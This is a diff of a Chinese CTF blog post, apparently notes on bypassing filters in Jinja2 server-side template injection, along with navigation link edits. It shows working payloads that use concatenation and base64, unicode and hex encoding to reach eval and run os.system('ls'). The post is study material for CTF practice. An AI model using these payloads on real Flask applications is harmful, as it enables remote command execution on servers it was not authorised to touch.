+<h2 id="过滤了-v3"><a class="header-anchor" href="#过滤了-v3">¶</a>过滤了_</h2>
+<p>可以利用<code>request.args.payload</code>来绕过，它相当于是返回url的查询字符串中参数payload的值</p>
+<h2 id="过滤了指定字符串"><a class="header-anchor" href="#过滤了指定字符串">¶</a>过滤了指定字符串</h2>
+<p>用拼接绕过：</p>
+<p><code>''.__class__.__base__.__subclasses__()[128]</code>  =&gt;  <code>''['__cla''ss__']['__bas''e__']['__subcla''sses__']()[128]</code>  =&gt;  <code>''['__cla'+'ss__']['__bas'+'e__']['__subcla'+'sses__']()[128]</code></p>
+<p>反正参数如果是字符串的话都可以用拼接</p>
+<p>用编码绕过：</p>
+<p><code>&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImxzIik='.decode('base64'))&#125;&#125;</code>  =&gt;</p>
+<p><code>&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')&#125;&#125;</code> =&gt;</p>
+<p><code>&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0022\u006f\u0073\u0022\u0029\u002e\u0073\u0079\u0073\u0074\u0065\u006d\u0028\u0022\u006c\u0073\u0022\u0029')&#125;&#125;</code> =&gt;</p>
+<p><code>&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x6c\x73\x22\x29')&#125;&#125;</code></p>
+<h1><code>其他可能想问的</code></h1>
+<h2 id="什么时候用"><a class="header-anchor" href="#什么时候用">¶</a>什么时候用(),[]</h2>
+<p>这个就是你对python的掌握程度了。</p>
+<p><code>xxx(payload)</code>表示调用函数，<code>payload</code>根据函数来看看需要传什么</p>
+<p>xxx[payload]表示索引列表中的对象，payload是它的下标或者键值</p>
+<p>不过这么问似乎有点…（你类比于c语言也知道，()主要出现在函数啊，[]主要出现在数组啊）</p>
+<h2 id="这过滤的手段好多啊"><a class="header-anchor" href="#这过滤的手段好多啊">¶</a>这过滤的手段好多啊</h2>
+<p>只能说多积累就好了，建议在积累的时候多了解一下这些方法的功能是什么，大致原理是什么</p>
+<p>有的过滤加了很多限制，多学学打组合拳</p>
 
       </section>
 
@@ -211,8 +272,8 @@
     
     <div class="card-text">
       
-        <a href="/2024/11/13/DSBCTF/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">DSBCTF复现</h2>
+        <a href="/2024/12/06/ctfshow-misc/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">ctfshow-misc篇</h2>
         </a>
       
       <div class="card-text--row">Newer</div>
@@ -226,8 +287,8 @@
     
     <div class="card-text">
       
-        <a href="/2024/09/02/XGCTF/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">XGCTF</h2>
+        <a href="/2024/11/13/DSBCTF/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">DSBCTF复现</h2>
         </a>
       
       <div class="card-text--row">Older</div>
